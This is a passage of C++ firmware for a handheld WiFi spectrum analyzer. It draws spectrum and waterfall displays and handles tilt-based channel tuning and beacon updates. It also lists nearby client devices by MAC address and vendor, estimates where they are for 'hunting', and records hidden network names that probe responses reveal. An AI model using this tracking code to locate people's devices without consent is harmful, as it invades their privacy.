    uint16_t freq = (uint16_t)channelToFreq(channel);  // MHz as integer
    
    // Format pps
    char ppsStr[8];
    uint32_t pps = displayPps;
    if (viewBand == SpectrumBand::BAND_5 && JanusHog::getCurrentOp() == C5Op::PACKET_MONITOR) {
        pps = JanusHog::getPacketsPerSecond();
    }
    if (pps >= 1000) {
        snprintf(ppsStr, sizeof(ppsStr), "%.1fk", pps / 1000.0f);
    } else {
        snprintf(ppsStr, sizeof(ppsStr), "%lu", pps);
    }
    
    // Format: "CH7 2442MHz 42pps" or "LCK7 2442MHz 42pps"
    snprintf(info, sizeof(info), "%s%d %dMHz %spps", prefix, channel, freq, ppsStr);
    
    canvas.setTextSize(1);
    canvas.setTextColor(fg);
    canvas.setTextDatum(top_right);  // top-right align
    canvas.drawString(info, 236, infoY);
    canvas.setTextDatum(top_left);  // reset
}

// Draw animated noise floor at spectrum baseline
// Creates realistic "grass" effect like a real spectrum analyzer
void SpectrumMode::drawNoiseFloor(M5Canvas& canvas, uint16_t fg) {
    int baseY = SPECTRUM_BOTTOM;

    // Draw noise floor line with random jitter
    for (int x = SPECTRUM_LEFT; x < SPECTRUM_RIGHT; x++) {
        uint8_t noise = fastNoise();

        int noiseUp = noise / 2;      // 0-3 pixels up
        int noiseDown = noise / 4;    // 0-1 pixels down

        if (noiseUp > 0) {
            canvas.drawFastVLine(x, baseY - noiseUp, noiseUp, fg);
        }
        if (noiseDown > 0 && (x % 3) == 0) {
            canvas.drawPixel(x, baseY + 1, fg);
        }
    }
}

// Update spectrum buffers from network RSSI data
// Called each frame to populate spectrumBuffer for waterfall
void SpectrumMode::updateSpectrumBuffers() {
    // Clear current frame buffer to noise floor
    for (int i = 0; i < SPECTRUM_WIDTH; i++) {
        spectrumBuffer[i] = NOISE_FLOOR_DB + (fastNoise() % 4) - 2;  // -94 to -90 dB noise
    }
    
    // Accumulate signal from each visible network (current view band)
    const int bufWidth = SPECTRUM_WIDTH;
    float bufPixelToFreq = viewWidthMHz / (float)bufWidth;
    float bufLeftFreq = viewCenterMHz - viewWidthMHz / 2;

    for (uint16_t n = 0; n < renderCount; n++) {
        const SpectrumRenderNet& net = renderNets[n];
        if (!matchesFilterRender(net)) continue;

        float centerFreq = net.displayFreqMHz;
        int8_t rssi = net.rssi;

        // Draw sinc lobe into buffer
        for (int x = 0; x < bufWidth; x++) {
            // Convert X to frequency
            float freq = bufLeftFreq + (float)x * bufPixelToFreq;
            float dist = freq - centerFreq;
            
            // Get sinc amplitude
            float amp = getSincAmplitude(dist);
            if (amp < 0.05f) continue;  // Skip negligible contributions
            
            // Calculate RSSI at this point
            int8_t signalRssi = NOISE_FLOOR_DB + (int8_t)((rssi - NOISE_FLOOR_DB) * amp);
            
            // Take max of existing and new signal (signals don't add in dB space simply)
            if (signalRssi > spectrumBuffer[x]) {
                spectrumBuffer[x] = signalRssi;
            }
        }
    }
    
    // Update persistence buffer (rolling average for smoother display)
    for (int i = 0; i < SPECTRUM_WIDTH; i++) {
        spectrumPersist[i] = smoothIIR(spectrumPersist[i], spectrumBuffer[i], 4);
        
        // Update peak hold
        if (spectrumBuffer[i] > spectrumPeak[i]) {
            spectrumPeak[i] = spectrumBuffer[i];
        } else {
            // Decay peaks slowly
            if (spectrumPeak[i] > RSSI_MIN) {
                spectrumPeak[i]--;
            }
        }
    }
}

// Push current spectrum buffer to waterfall history
void SpectrumMode::updateWaterfall() {
    uint32_t now = millis();
    if (now - lastWaterfallUpdate < WATERFALL_UPDATE_MS) return;
    lastWaterfallUpdate = now;
    
    // Convert current spectrumBuffer to intensity (0-255) and store in waterfall
    for (int x = 0; x < SPECTRUM_WIDTH; x++) {
        // Map RSSI (-95 to -30) to intensity (0-255)
        int8_t rssi = spectrumPersist[x];
        int intensity = (int)((rssi - RSSI_MIN) * 255 / (RSSI_MAX - RSSI_MIN));
        if (intensity < 0) intensity = 0;
        if (intensity > 255) intensity = 255;
        waterfallBuffer[waterfallWriteRow][x] = (uint8_t)intensity;
    }
    
    // Advance circular buffer write position
    waterfallWriteRow = (waterfallWriteRow + 1) % WATERFALL_ROWS;
}

// Draw waterfall display - historical spectrum scrolling down
void SpectrumMode::drawWaterfall(M5Canvas& canvas, uint16_t fg) {
    // Draw horizontal separator line above waterfall
    canvas.drawFastHLine(SPECTRUM_LEFT, WATERFALL_TOP - 1, SPECTRUM_WIDTH, fg);
    
    // Draw waterfall rows (oldest at top, newest at bottom)
    for (int row = 0; row < WATERFALL_ROWS; row++) {
        // Calculate which buffer row to read (circular buffer)
        // waterfallWriteRow points to NEXT write position, so oldest is at waterfallWriteRow
        int bufRow = (waterfallWriteRow + row) % WATERFALL_ROWS;
        int screenY = WATERFALL_TOP + row;
        
        // Draw each pixel in this row
        for (int x = 0; x < SPECTRUM_WIDTH; x++) {
            uint8_t intensity = waterfallBuffer[bufRow][x];
            
            // Only draw if above noise threshold (intensity > 20 means signal present)
            if (intensity > 20) {
                // Dithering for monochrome display:
                // Higher intensity = more pixels filled
                // Use position-based pattern for clean look
                bool drawPixel = false;
                
                if (intensity > 200) {
                    drawPixel = true;  // Full brightness - always draw
                } else if (intensity > 150) {
                    drawPixel = ((x + row) % 2) == 0;  // 50% checkerboard
                } else if (intensity > 100) {
                    drawPixel = ((x % 2) == 0) && ((row % 2) == 0);  // 25% grid
                } else if (intensity > 50) {
                    drawPixel = ((x % 3) == 0) && ((row % 2) == 0);  // ~16% sparse
                } else {
                    drawPixel = ((x % 4) == 0) && ((row % 3) == 0);  // ~8% very sparse
                }
                
                if (drawPixel) {
                    canvas.drawPixel(SPECTRUM_LEFT + x, screenY, fg);
                }
            }
        }
    }
}

// Draw client monitoring overlay [P3] [P12] [P14] [P15]
void SpectrumMode::drawClientOverlay(M5Canvas& canvas, uint16_t fg, uint16_t bg) {
    // [P12] Draw in mainCanvas area only (y=0 to y=90 max)
    // XP bar is at y=91, drawn separately in draw()

    canvas.setTextSize(1);
    canvas.setTextColor(fg, bg);
    
    // Bounds check [P3]
    if (!renderMonitor.valid) {
        canvas.setTextDatum(middle_center);
        canvas.drawString("NETWORK LOST", 120, 45);
        return;
    }
    
    const SpectrumRenderMonitor& net = renderMonitor;
    
    // Header: SSID or <hidden> [P15] - CH removed (shown in bottom bar)
    char header[40];
    if (net.ssid[0] == 0) {
        snprintf(header, sizeof(header), "CLIENTS: <HIDDEN>");
    } else {
        char truncSSID[24];
        strncpy(truncSSID, net.ssid, 22);
        truncSSID[22] = '\0';  // [P9] Explicit null termination
        // Uppercase for readability
        for (int i = 0; truncSSID[i]; i++) truncSSID[i] = toupper(truncSSID[i]);
        snprintf(header, sizeof(header), "CLIENTS: %s", truncSSID);
    }
    canvas.setTextDatum(top_left);
    canvas.drawString(header, 4, 2);
    
    // Empty list message [P14]
    if (net.clientCount == 0) {
        canvas.setTextDatum(middle_center);
        canvas.drawString("NEGATIVE CONTACT", 120, 40);
        canvas.drawString("RECON IN PROGRESS...", 120, 55);
        return;
    }
    
    // Client list (starts at y=18, 16px per line, max 4 visible)
    const int LINE_HEIGHT = 16;
    const int START_Y = 18;
    
    for (int i = 0; i < VISIBLE_CLIENTS && (i + clientScrollOffset) < net.clientCount; i++) {
        int clientIdx = i + clientScrollOffset;
        
        // Bounds check [P3]
        if (clientIdx >= net.clientCount) break;
        
        const SpectrumClient& client = net.clients[clientIdx];
        
        int y = START_Y + (i * LINE_HEIGHT);
        bool selected = (clientIdx == selectedClientIndex);
        
        // Highlight selected row
        if (selected) {
            canvas.fillRect(0, y, 240, LINE_HEIGHT, fg);
            canvas.setTextColor(bg, fg);
        } else {
            canvas.setTextColor(fg, bg);
        }
        
        // Format: "1. Vendor  XX:XX:XX  -XXdB >> Xs"
        uint32_t age = (millis() - client.lastSeen) / 1000;
        char line[52];
        
        // Use cached vendor from discovery time - uppercase for display
        const char* vendorRaw = client.vendor ? client.vendor : "UNKNOWN";
        char vendorUpper[10];
        strncpy(vendorUpper, vendorRaw, 9);
        vendorUpper[9] = '\0';
        for (int i = 0; vendorUpper[i]; i++) vendorUpper[i] = toupper(vendorUpper[i]);
        
        // Calculate relative position: client vs AP signal
        // Positive delta = client closer to us than AP
        int delta = client.rssi - net.rssi;
        const char* arrow;
        if (delta > 10) arrow = ">>";       // Much closer to us
        else if (delta > 3) arrow = "> ";   // Closer
        else if (delta < -10) arrow = "<<"; // Much farther
        else if (delta < -3) arrow = "< ";  // Farther
        else arrow = "==";                  // Same distance
        
        // [P9] Safe string formatting with bounds
        // Show vendor (8 chars) + last 4 octets + arrow for hunting
        snprintf(line, sizeof(line), "%d.%-8s %02X:%02X:%02X:%02X %03ddB %02luS %s",
            clientIdx + 1,
            vendorUpper,
            client.mac[2], client.mac[3], client.mac[4], client.mac[5],
            client.rssi,
            age,
            arrow);
        
        canvas.setTextDatum(top_left);
        canvas.drawString(line, 4, y + 2);
    }
    
    // Scroll indicators
    canvas.setTextColor(fg, bg);
    if (clientScrollOffset > 0) {
        canvas.setTextDatum(top_right);
        canvas.drawString("^", 236, 18);  // More above
    }
    if (clientScrollOffset + VISIBLE_CLIENTS < net.clientCount) {
        canvas.setTextDatum(bottom_right);
        canvas.drawString("v", 236, 82);  // More below
    }
    
    // Draw client detail popup if active
    if (clientDetailActive) {
        drawClientDetail(canvas, fg, bg);
    }

    // Draw reveal mode overlay (persistent toast with live count)
    if (revealingClients) {
        int boxW = 160;
        int boxH = 40;
        int boxX = (240 - boxW) / 2;
        int boxY = (90 - boxH) / 2;

        // Black border then inverted fill
        canvas.fillRoundRect(boxX - 2, boxY - 2, boxW + 4, boxH + 4, 8, bg);
        canvas.fillRoundRect(boxX, boxY, boxW, boxH, 8, fg);

        // Black text on inverted background
        canvas.setTextColor(bg, fg);
        canvas.setTextDatum(middle_center);
        canvas.drawString("WAKIE WAKIE", 120, boxY + 12);
        
        // Show live client count
        char countStr[24];
        snprintf(countStr, sizeof(countStr), "FOUND: %d", net.clientCount);
        canvas.drawString(countStr, 120, boxY + 28);
    }
}

// Draw client detail popup - modal overlay with full client info
void SpectrumMode::drawClientDetail(M5Canvas& canvas, uint16_t fg, uint16_t bg) {
    // Bounds validation - close popup if client no longer exists
    if (!renderMonitor.valid) {
        clientDetailActive = false;
        return;
    }
    
    const SpectrumRenderMonitor& net = renderMonitor;
    
    if (selectedClientIndex < 0 || selectedClientIndex >= net.clientCount) {
        clientDetailActive = false;
        return;
    }
    
    const SpectrumClient& client = net.clients[selectedClientIndex];
    
    // Close popup if viewed client changed (was pruned, index now points to different client)
    if (memcmp(client.mac, detailClientMAC, 6) != 0) {
        clientDetailActive = false;
        return;
    }
    
    // Modal box dimensions - medium size per design spec
    const int boxW = 200;
    const int boxH = 75;
    const int boxX = (canvas.width() - boxW) / 2;
    const int boxY = (canvas.height() - boxH) / 2 - 5;
    
    // Black border then pink fill (standard popup pattern)
    canvas.fillRoundRect(boxX - 2, boxY - 2, boxW + 4, boxH + 4, 8, bg);
    canvas.fillRoundRect(boxX, boxY, boxW, boxH, 8, fg);

    // Black text on pink background
    canvas.setTextColor(bg, fg);
    canvas.setTextDatum(top_center);
    canvas.setTextSize(1);
    
    int centerX = canvas.width() / 2;
    
    // Line 1: Full MAC address
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
        client.mac[0], client.mac[1], client.mac[2],
        client.mac[3], client.mac[4], client.mac[5]);
    canvas.drawString(macStr, centerX, boxY + 6);
    
    // Line 2: Vendor name (uppercase, truncated if needed)
    const char* vendorRaw = client.vendor ? client.vendor : "Unknown";
    char vendorUpper[25];
    strncpy(vendorUpper, vendorRaw, 24);
    vendorUpper[24] = '\0';
    for (int i = 0; vendorUpper[i]; i++) vendorUpper[i] = toupper(vendorUpper[i]);
    canvas.drawString(vendorUpper, centerX, boxY + 20);
    
    // Line 3: RSSI and age
    uint32_t age = (millis() - client.lastSeen) / 1000;
    char statsStr[28];
    snprintf(statsStr, sizeof(statsStr), "RSSI: %ddB  AGE: %luS", client.rssi, age);
    canvas.drawString(statsStr, centerX, boxY + 38);
    
    // Line 4: Position relative to AP
    int delta = client.rssi - net.rssi;
    const char* position;
    if (delta > 10) position = "CLOSER TO YOU THAN AP";
    else if (delta > 3) position = "SLIGHTLY CLOSER";
    else if (delta < -10) position = "FAR FROM YOU";
    else if (delta < -3) position = "SLIGHTLY FARTHER";
    else position = "SAME DISTANCE AS AP";
    canvas.drawString(position, centerX, boxY + 52);
    
    // Line 5: Dismiss hint
    canvas.drawString("[ANY KEY] CLOSE", centerX, boxY + 64);
    
    // Reset datum
    canvas.setTextDatum(top_left);
}

void SpectrumMode::drawSpectrum(M5Canvas& canvas, uint16_t fg, uint16_t bg) {
    // Copy pointers to avoid heap allocations in render loop
    const size_t maxCount = renderCount;
    const size_t cap = (maxCount > MAX_SPECTRUM_NETWORKS) ? MAX_SPECTRUM_NETWORKS : maxCount;
    const SpectrumRenderNet* snapshot[MAX_SPECTRUM_NETWORKS];
    size_t snapshotCount = 0;
    for (size_t i = 0; i < cap; i++) {
        snapshot[snapshotCount++] = &renderNets[i];
    }
 
    // Sort pointers by RSSI (weakest first, so strongest draws on top)
    std::sort(snapshot, snapshot + snapshotCount, [](const SpectrumRenderNet* a, const SpectrumRenderNet* b) {
        return a->rssi < b->rssi;
    });

    const SpectrumRenderNet* visible[MAX_SPECTRUM_NETWORKS];
    size_t visibleCount = 0;
    for (size_t i = 0; i < snapshotCount; i++) {
        const SpectrumRenderNet* net = snapshot[i];
        if (!matchesFilterRender(*net)) continue;
        visible[visibleCount++] = net;
    }

    size_t start = 0;
    size_t topLimit = Config::wifi().spectrumTopN;
    // 5GHz scans are typically sparse; always render all matching entries for stability/clarity.
    if (viewBand == SpectrumBand::BAND_5) {
        topLimit = 0;
    }
    if (topLimit > MAX_SPECTRUM_NETWORKS) topLimit = MAX_SPECTRUM_NETWORKS;
    if (topLimit > 0 && visibleCount > topLimit) {
        start = visibleCount - topLimit;
    }

    // Draw each network's Gaussian lobe (only if matches filter)
    for (size_t i = start; i < visibleCount; i++) {
        const auto& net = *visible[i];

        // Use smoothed display frequency to prevent left/right jitter
        float freq = net.displayFreqMHz;

        // Check if selected (compare by BSSID)
        bool isSelected = false;
        if (renderSelected.valid) {
            isSelected = (memcmp(net.bssid, renderSelected.bssid, 6) == 0);
        }

        uint16_t activity = 0;
        if (net.channel >= 1 && net.channel <= 13) {
            activity = channelActivityRate[net.channel];
        }
        uint8_t seed = (uint8_t)(net.bssid[0] ^ net.bssid[2] ^ net.bssid[5]);
        drawGaussianLobe(canvas, freq, net.rssi, isSelected, activity, seed, fg);
    }
}

// Helper: Get Sinc amplitude at distance d from center using LUT + interpolation
// Sinc function has natural side lobes at ±11MHz, ±17MHz (nulls at ±11, ±22)
static float getSincAmplitude(float dist) {
    float lutPos = dist + 22.0f;  // Map -22..+22 to 0..44
    if (lutPos < 0.0f || lutPos > 44.0f) return 0.0f;
    int lutIdx = (int)lutPos;
    float frac = lutPos - lutIdx;
    if (lutIdx >= 44) return SINC_LUT[44];
    return SINC_LUT[lutIdx] + frac * (SINC_LUT[lutIdx + 1] - SINC_LUT[lutIdx]);
}

// Legacy Gaussian helper (kept for reference)
static float getGaussianAmplitude(float dist) {
    float lutPos = dist + 15.0f;  // Map -15..+15 to 0..30
    if (lutPos < 0.0f || lutPos > 30.0f) return 0.0f;
    int lutIdx = (int)lutPos;
    float frac = lutPos - lutIdx;
    if (lutIdx >= 30) return GAUSSIAN_LUT[30];
    return GAUSSIAN_LUT[lutIdx] + frac * (GAUSSIAN_LUT[lutIdx + 1] - GAUSSIAN_LUT[lutIdx]);
}

void SpectrumMode::drawGaussianLobe(M5Canvas& canvas, float centerFreqMHz,
                                     int8_t rssi, bool filled, uint16_t activityPps, uint8_t seed, uint16_t fg) {
    // Sinc-based carrier wave rendering with visible side lobes
    // Real RF signals have sinc shape: main lobe + decaying side lobes
    // Extended range to ±22MHz to show side lobes like a real spectrum analyzer

    float center = centerFreqMHz;
    float bandMin = (viewBand == SpectrumBand::BAND_24) ? BAND_MIN_MHZ : BAND5_MIN_MHZ;
    float bandMax = (viewBand == SpectrumBand::BAND_24) ? BAND_MAX_MHZ : BAND5_MAX_MHZ;
    
    // Sinc extends ±22MHz (to show side lobes)
    const float SINC_HALF_WIDTH = 22.0f;
    float startFreq = fmax(center - SINC_HALF_WIDTH, bandMin);
    float endFreq = fmin(center + SINC_HALF_WIDTH, bandMax);
    
    int peakY = rssiToY(rssi);
    int baseY = SPECTRUM_BOTTOM;
    int lobeHeight = baseY - peakY;
    
    // Don't draw if peak is below baseline
    if (lobeHeight <= 0) return;
    
    // Calculate X coordinates
    int leftX = freqToX(startFreq);
    int rightX = freqToX(endFreq);
    
    // Clip to visible area
    if (rightX < SPECTRUM_LEFT || leftX > SPECTRUM_RIGHT) return;
    leftX = max(leftX, SPECTRUM_LEFT);
    rightX = min(rightX, SPECTRUM_RIGHT);

    // Precompute X→freq mapping for the loop
    float effectiveWidth = (float)(SPECTRUM_RIGHT - SPECTRUM_LEFT);

    // === SINC CARRIER WAVE: Draw as connected line segments ===
    // Activity-based animation (subtle vertical jitter)
    int8_t jitterOffset = 0;
    float activityRatio = 0.0f;
    if (activityPps > 0) {
        uint16_t capped = min(activityPps, (uint16_t)400);
        activityRatio = (float)capped / 400.0f;
        float jitterAmp = 2.0f * activityRatio;
        uint32_t phaseMs = (uint32_t)((millis() + seed * 31u) * 8u) % 1000u;
        // Fast sine via 64-entry LUT (replaces sinf ~70 cycles with 1-cycle array lookup)
        uint8_t phaseIdx = (uint8_t)((phaseMs * 64u) / 1000u) & 63;
        jitterOffset = (int8_t)(jitterAmp * (float)fastSinQ7(phaseIdx) * (1.0f / 127.0f));
    }

    // Micro amplitude flutter (keeps center frequency stable)
    float flutterAmp = 0.02f + 0.03f * activityRatio;  // 2%..5%
    uint32_t periodMs = 1800u - (uint32_t)(activityRatio * 1000.0f);  // 1800..800ms
    uint32_t flutterPhaseMs = (millis() + seed * 53u) % periodMs;
    // Fast sine via LUT (replaces second sinf call)
    uint8_t flutterIdx = (uint8_t)((flutterPhaseMs * 64u) / periodMs) & 63;
    float flutter = 1.0f + flutterAmp * ((float)fastSinQ7(flutterIdx) / 127.0f);
    int lobeHeightMod = (int)(lobeHeight * flutter);
    int maxHeight = baseY - SPECTRUM_TOP;
    if (lobeHeightMod < 1) lobeHeightMod = 1;
    if (lobeHeightMod > maxHeight) lobeHeightMod = maxHeight;

    // Activity-weighted fill shimmer (selected network only)
    uint8_t shimmerMod = 1;
    uint8_t shimmerPhase = 0;
    if (filled) {
        // Lower activity = sparser fill, higher activity = solid
        shimmerMod = 1 + (uint8_t)((1.0f - activityRatio) * 2.0f);  // 1..3
        if (shimmerMod < 1) shimmerMod = 1;
        if (shimmerMod > 3) shimmerMod = 3;
        uint32_t shimmerTick = (millis() / 60u) + seed;
        shimmerPhase = (uint8_t)(shimmerTick % shimmerMod);
    }
    
    // Draw carrier wave as connected line segments (1 pixel step)
    int prevX = leftX;
    int prevY = baseY;
    bool prevValid = false;
    
    for (int x = leftX; x <= rightX; x++) {
        // Convert X back to frequency (use effective width for mapping)
        float freq = viewCenterMHz - viewWidthMHz / 2 +
                    (float)(x - SPECTRUM_LEFT) * viewWidthMHz / effectiveWidth;
        float dist = freq - center;
        
        // Get sinc amplitude (includes side lobes)
        float amp = getSincAmplitude(dist);
        
        // Calculate Y with activity jitter
        int y = baseY - (int)(lobeHeightMod * amp) + jitterOffset;
        y = constrain(y, SPECTRUM_TOP, baseY);
        
        if (filled) {
            // Filled: draw vertical line from baseline to curve
            if (y < baseY) {
                if (shimmerMod == 1 || ((uint8_t)(x + shimmerPhase) % shimmerMod) == 0) {
                    canvas.drawFastVLine(x, y, baseY - y, fg);
                }
            }
        } else {
            // Outline: connect to previous point
            if (prevValid && (prevY < baseY || y < baseY)) {
                canvas.drawLine(prevX, prevY, x, y, fg);
            }
        }
        
        prevX = x;
        prevY = y;
        prevValid = true;
    }
    
    // For outline mode: connect to baseline at edges
    if (!filled) {
        // Left edge
        int leftEdgeY = baseY - (int)(lobeHeightMod * getSincAmplitude(startFreq - center));
        if (leftEdgeY < baseY) {
            canvas.drawLine(leftX, baseY, leftX, leftEdgeY, fg);
        }
        // Right edge
        int rightEdgeY = baseY - (int)(lobeHeightMod * getSincAmplitude(endFreq - center));
        if (rightEdgeY < baseY) {
            canvas.drawLine(rightX, rightEdgeY, rightX, baseY, fg);
        }
    }
}

int SpectrumMode::freqToX(float freqMHz) {
    float leftFreq = viewCenterMHz - viewWidthMHz / 2;
    int width = SPECTRUM_RIGHT - SPECTRUM_LEFT;
    return SPECTRUM_LEFT + (int)((freqMHz - leftFreq) * width / viewWidthMHz);
}

int SpectrumMode::rssiToY(int8_t rssi) {
    // Clamp to range
    if (rssi < RSSI_MIN) rssi = RSSI_MIN;
    if (rssi > RSSI_MAX) rssi = RSSI_MAX;
    
    // Map RSSI to Y (inverted - stronger = higher on screen = lower Y)
    int height = SPECTRUM_BOTTOM - SPECTRUM_TOP;
    return SPECTRUM_BOTTOM - (int)(((float)(rssi - RSSI_MIN) / (RSSI_MAX - RSSI_MIN)) * height);
}

float SpectrumMode::channelToFreq(uint8_t channel) {
    // 5GHz band: freq = 5000 + channel * 5
    if (channel >= 36) {
        return 5000.0f + channel * 5.0f;
    }
    // 2.4GHz band: Ch1=2412MHz, 5MHz spacing, Ch13=2472MHz
    if (channel < 1) channel = 1;
    if (channel > 13) channel = 13;
    return 2412.0f + (channel - 1) * 5.0f;
}

// ============================================================
// DIAL MODE: TILT-TO-TUNE CHANNEL SELECTION
// When device goes UPRIGHT (UPS), dial mode activates automatically
// Accelerometer tilt left/right selects channel with smooth sliding indicator
// ============================================================

void SpectrumMode::updateDialChannel() {
    // Skip if not Cardputer ADV (no accelerometer on regular Cardputer)
    if (M5.getBoard() != m5::board_t::board_M5CardputerADV) return;
    
    // Skip if tilt-to-tune is disabled
    if (!Config::wifi().spectrumTiltEnabled) {
        if (dialMode) {
            dialMode = false;
            dialLocked = false;
            if (NetworkRecon::isChannelLocked()) {
                NetworkRecon::unlockChannel();
            }
        }
        return;
    }
    
    // Skip if in client monitor mode
    if (monitoringNetwork) return;
    
    uint32_t now = millis();
    uint32_t staleMs = Config::wifi().spectrumStaleMs;
    if (staleMs < 1000) staleMs = 1000;
    if (staleMs > 60000) staleMs = 60000;
    
    // ==[ READ IMU ]== accelerometer
    float ax, ay, az;
    M5.Imu.getAccel(&ax, &ay, &az);
    
    // ==[ AUTO FLT/UPS MODE SWITCH WITH HYSTERESIS ]==
    // FLT (flat): normal spectrum mode, auto-hopping
    // UPS (upright): dial mode activates, accelerometer controls channel
    // Hysteresis prevents flickering at boundary:
    //   Enter UPS when |az| < 0.5 (clearly upright)
    //   Exit UPS when |az| > 0.7 (clearly flat)
    //   Between 0.5-0.7: maintain previous state
    float absAz = fabsf(az);
    
    bool deviceFlat;
    if (dialWasUpright) {
        // Currently upright - need strong flat signal to exit
        deviceFlat = absAz > 0.7f;
    } else {
        // Currently flat - need strong upright signal to enter
        deviceFlat = absAz > 0.5f;
    }
    dialWasUpright = !deviceFlat;
    
    if (deviceFlat) {
        // Device flat - disable dial mode, return to normal hopping
        // But only after 200ms debounce to prevent flicker
        if (dialMode && (now - dialModeEntryTime >= 200)) {
            dialMode = false;
            // Release lock so NetworkRecon can resume hopping.
            if (NetworkRecon::isChannelLocked()) {
                NetworkRecon::unlockChannel();
            }
        }
        return;  // No dial update when flat
    } else {
        // Device upright - enable dial mode
        if (!dialMode) {
            dialMode = true;
            dialModeEntryTime = now;
            lastDialUpdate = now;  // Reset timing to avoid dt jump
            // Initialize smooth position to current channel
            dialPositionSmooth = (float)currentChannel;
            dialPositionTarget = dialPositionSmooth;
            dialChannel = currentChannel;
            NetworkRecon::lockChannel(dialChannel);
        }
    }
    
    // ==[ DIAL LOCKED ]== skip gyro reading but keep channel
    if (dialLocked) {
        // Keep channel locked
        if (currentChannel != dialChannel) {
            NetworkRecon::lockChannel(dialChannel);
            currentChannel = dialChannel;
        }
        return;
    }
    
    // ==[ LANDSCAPE UPRIGHT JOG CONTROL ]==
    // JOG WHEEL behavior - tilt to scroll channels, level to stop.
    // Ported from Sirloin for satisfying feel.
    
    const float DEADZONE = 0.05f;      // tiny deadzone - just noise rejection
    const float SCROLL_SPEED = 25.0f;  // FAST: full sweep in ~0.5s at max tilt
    
    // Use -ax for left/right tilt in landscape upright orientation
    // Tilt right (right edge down) → ax positive → -ax negative → BUT we want higher channels
    // So invert: tilt right = positive scroll = higher channels
    float tilt = -ax;
    
    // Apply deadzone
    if (fabsf(tilt) < DEADZONE) {
        tilt = 0.0f;
    } else {
        // Remove deadzone from value, preserve sign
        tilt = (tilt > 0) ? (tilt - DEADZONE) : (tilt + DEADZONE);
    }
    
    // Clamp to ±1 range (values beyond ±1g are extreme)
    tilt = constrain(tilt, -1.0f, 1.0f);
    
    // Calculate time delta
    float dt = (now - lastDialUpdate) / 1000.0f;
    if (dt > 0.1f) dt = 0.1f;  // cap to avoid jumps after pause
    if (dt < 0.001f) dt = 0.016f;  // minimum ~60fps equivalent
    
    // Apply scroll: tilt controls velocity (jog wheel style)
    // Positive tilt → higher channels, Negative tilt → lower channels
    dialPositionTarget += tilt * SCROLL_SPEED * dt;
    dialPositionTarget = constrain(dialPositionTarget, 1.0f, 13.0f);
    
    // ==[ SMOOTH INTERPOLATION ]== faster lerp for responsiveness
    dialPositionSmooth += (dialPositionTarget - dialPositionSmooth) * 0.3f;
    
    // ==[ CHANNEL FROM SMOOTH POSITION ]== rounded integer
    int newChannel = (int)roundf(dialPositionSmooth);
    newChannel = constrain(newChannel, 1, 13);  // WiFi channels 1-13 only
    
    // ==[ UPDATE CHANNEL IF CHANGED ]==
    if (newChannel != dialChannel) {
        dialChannel = newChannel;
        NetworkRecon::lockChannel(dialChannel);
        currentChannel = dialChannel;
        SFX::play(SFX::CLICK);  // tick sound on channel change
        
        // Scroll spectrum view to keep dial channel centered
        viewCenterMHz = channelToFreq(dialChannel);
    }
    // Note: Redundant channel enforcement removed - above block already ensures
    // currentChannel == dialChannel after any change
    
    lastDialUpdate = now;
}

void SpectrumMode::pruneStale() {
    // Guard against callback modifying networks during prune
    busy = true;
    
    uint32_t now = millis();
    uint32_t staleMs = Config::wifi().spectrumStaleMs;
    if (staleMs < 1000) staleMs = 1000;
    if (staleMs > 60000) staleMs = 60000;
    
    // Save BSSID of selected network before pruning
    uint8_t selectedBSSID[6] = {0};
    bool hadSelection = (selectedIndex >= 0 && selectedIndex < (int)networks.size());
    if (hadSelection) {
        memcpy(selectedBSSID, networks[selectedIndex].bssid, 6);
    }
    
    // Remove networks not seen recently
    networks.erase(
        std::remove_if(networks.begin(), networks.end(), 
            [now, staleMs](const SpectrumNetwork& n) {
                return (now - n.lastSeen) > staleMs;
            }),
        networks.end()
    );
    
    // Restore selection by finding BSSID in new vector
    if (hadSelection) {
        selectedIndex = -1;  // Assume lost
        for (size_t i = 0; i < networks.size(); i++) {
            if (memcmp(networks[i].bssid, selectedBSSID, 6) == 0) {
                selectedIndex = (int)i;
                break;
            }
        }
    } else if (selectedIndex >= (int)networks.size()) {
        // No prior selection, just bounds-check
        selectedIndex = networks.empty() ? -1 : 0;
    }
    
    busy = false;
}

void SpectrumMode::onBeacon(const uint8_t* bssid, uint8_t channel, bool channelTrusted, int8_t rssi, const char* ssid, wifi_auth_mode_t authmode, bool hasPMF, bool isProbeResponse) {
    // Skip if main thread is accessing networks
    if (busy) return;
    
    // Validate inputs to prevent crashes
    if (!bssid || channel < 1 || channel > 13) return;
    
    bool hasSSID = (ssid && ssid[0] != 0);
    
    // [BUG3 FIX] Look for existing network - use index-based loop with size snapshot
    // This avoids iterator invalidation if vector is modified between iterations
    size_t count = networks.size();
    for (size_t i = 0; i < count; i++) {
        // Re-check busy each iteration in case main thread started work
        if (busy) return;
        
        // Bounds check in case vector shrunk
        if (i >= networks.size()) break;
        
        SpectrumNetwork& net = networks[i];
        if (memcmp(net.bssid, bssid, 6) == 0) {
            // Update existing - these are atomic writes, safe without lock
            net.rssi = smoothIIR(net.rssi, rssi, 4);
            net.lastSeen = millis();
            net.authmode = authmode;  // Update auth mode
            net.hasPMF = hasPMF;      // Update PMF status
            uint8_t prevChannel = net.channel;
            if (channelTrusted) {
                net.channel = channel;    // Update channel only when trusted
            }
            
            // Smooth the display frequency with EMA to prevent left/right jitter
            // Snap immediately on trusted channel change to avoid ghost trails.
            // Also snap if already close to target (prevents micro-oscillation artifacts)
            float targetFreq = channelToFreq(net.channel);
            float freqDiff = fabsf(targetFreq - net.displayFreqMHz);
            
            if (channelTrusted && prevChannel != net.channel) {
                // Channel changed - snap immediately to avoid ghost trails
                net.displayFreqMHz = targetFreq;
            } else if (freqDiff < 0.5f) {
                // Close enough - snap to target (prevents micro-jitter)
                net.displayFreqMHz = targetFreq;
            } else if (freqDiff > 5.0f) {
                // Far off (more than 1 channel) - fast snap (alpha=0.5)
                net.displayFreqMHz += (targetFreq - net.displayFreqMHz) * 0.5f;
            } else {
                // Normal smoothing - reduced alpha for faster response
                net.displayFreqMHz += (targetFreq - net.displayFreqMHz) * 0.25f;
            }
            
            // Clamp to valid range
            if (net.displayFreqMHz < MIN_CENTER_MHZ) net.displayFreqMHz = MIN_CENTER_MHZ;
            if (net.displayFreqMHz > MAX_CENTER_MHZ) net.displayFreqMHz = MAX_CENTER_MHZ;
            
            // Probe response can reveal hidden SSID
            if (hasSSID && net.isHidden && net.ssid[0] == 0) {
                strncpy(net.ssid, ssid, 32);
                net.ssid[32] = 0;
                net.wasRevealed = true;
                // Defer logging to main thread (avoid Serial in WiFi callback)
